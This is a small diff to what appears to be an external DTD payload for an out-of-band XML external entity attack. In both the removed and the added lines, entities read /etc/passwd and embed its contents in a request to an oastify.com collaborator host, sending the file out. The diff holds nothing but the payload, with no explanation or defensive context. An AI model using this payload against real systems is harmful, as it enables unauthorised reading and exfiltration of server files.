@@ -1,3 +1,2 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://oa292r4ffkfs1i2sgguiwllxioofck09.oastify.com/?data=%file;'>">
-%all;
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://xstllnrhuwmlfiqaomvcdjv6oxuoie63.oastify.com/?data=%data;'>">
